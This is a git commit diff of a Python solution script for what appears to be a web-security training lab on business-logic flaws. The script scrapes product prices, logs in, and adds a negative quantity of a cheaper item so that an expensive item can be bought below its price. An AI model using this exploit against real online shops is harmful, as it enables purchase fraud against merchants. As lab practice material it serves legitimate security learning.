6de1b273a6446cda5ff3f0aaf4ee285ba14f6b08
SoTraore <107843654+SoTraore@users.noreply.github.com>
2023-09-12 17:48:55 +0200

    Adding business logic new lab solution

--- web_acad/business_logic/lab2.py
+++ web_acad/business_logic/lab2.py
@@ -1,6 +1,8 @@
 import requests
 import sys
+import re
 import urllib3
+import random
 from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -11,9 +13,30 @@ def get_csrf_token(session, url) :
     res = session.get(url, proxies=proxies, verify=False)
     soup = BeautifulSoup(res.text, 'html.parser')
     csrf_token = soup.find('input', {'name':'csrf'})['value']
-    return csrf_token
-
+    if csrf_token :    
+        return csrf_token
+    return None
+    
 def business_logic_exploit(session, url) :
+    
+    response = session.get(url, verify=False, proxies=proxies)
+    
+    # Use regex to find all prices and corresponding productId
+    pattern = r'\$(\d+\.\d{2})[\s\S]*?productId=(\d+)'
+
+    matches = re.findall(pattern, response.text)
+
+    # Extracted prices and corresponding productId pairs
+    price_product_pairs = {float(match[0]): int(match[1]) for match in matches}
+    
+    max_key = max(price_product_pairs.keys())
+    second_item = max_key
+    
+    while second_item == max_key :
+        second_item = random.choice(list(price_product_pairs.keys()))
+ 
+    factor = int(max_key / second_item)
+
     # get the csrf token here
     login_url = url + '/login'
     csrf_token = get_csrf_token(session, login_url)
@@ -27,18 +50,11 @@ def business_logic_exploit(session, url) :
         
         # Add the wanted product
         add_item_url = url + '/cart'
-        data = {'productId':'1', 'redir':'PRODUCT', 'quantity':'1'}
+        data = {'productId': price_product_pairs[max_key], 'redir':'PRODUCT', 'quantity':'1'}
         session.post(add_item_url, data=data, proxies=proxies, verify=False)
         
         # (1 - 2)*price = -(price)
-        data = {'productId':'1', 'redir':'PRODUCT', 'quantity':'-2'}
-        session.post(add_item_url, data=data, proxies=proxies, verify=False)
-        
-        # productId=6&redir=PRODUCT&quantity=1
-        data = {'productId':'20', 'redir':'PRODUCT', 'quantity':'14'}
-        session.post(add_item_url, data=data, proxies=proxies, verify=False)
-        
-        data = {'productId':'6', 'redir':'PRODUCT', 'quantity':'1'}
+        data = {'productId':price_product_pairs[second_item], 'redir':'PRODUCT', 'quantity': -factor}
         session.post(add_item_url, data=data, proxies=proxies, verify=False)
         
         # Buying the item
